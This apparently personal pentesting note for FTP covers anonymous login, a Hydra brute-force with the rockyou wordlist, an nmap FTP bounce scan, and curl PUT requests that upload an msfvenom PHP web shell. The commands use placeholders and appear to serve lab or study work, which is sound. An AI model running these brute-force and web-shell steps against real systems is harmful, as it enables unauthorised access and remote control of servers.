Anonymous creds
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `ftp anonymous@${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
No passwd

ftp -h

![[Pasted image 20250512172641.png]]

ftp {target_IP}
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `ftp ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Name : Anonymous. Password : {Blank}

![[Pasted image 20250512172652.png]]
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `ftp -p ${ip} [portno]`;

dv.paragraph("```bash\n" + command + "\n```");
```

HYDRA CRACK

```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `hydra -l "[user]" -P /usr/share/wordlists/rockyou.txt -f ftp://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
if passive hangs,

```
passive
```

To turn passive mode off

"dir" 
	lists directories
	
![[Pasted image 20250512172723.png]]

Get (file), mget, put

![[Pasted image 20250512172800.png]]

cd, ls

exit

![[Pasted image 20250512172839.png]]

Can use [[Medusa]] to crack password

FTP Bounce attack

```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `nmap -Pn -v -n -p80 -b anonymous:password@${ip} [2ndip]`;

dv.paragraph("```bash\n" + command + "\n```");
```
-b is for bounce

Prove write access for web shell upload

```
curl -k -u [user]:[passwd] -X PUT --data-binary "Test123" https://[IP]/test.txt
curl -k -u [user]:[passwd] https://[IP]/test.txt
```

Create shell.php with [[msfvenom]]

Upload web shell

```
curl -k -X PUT -H "Host: $target" --basic -u [user]:[passwd] --data-binary @shell.php --path-as-is https://[IP]/shell.php
```

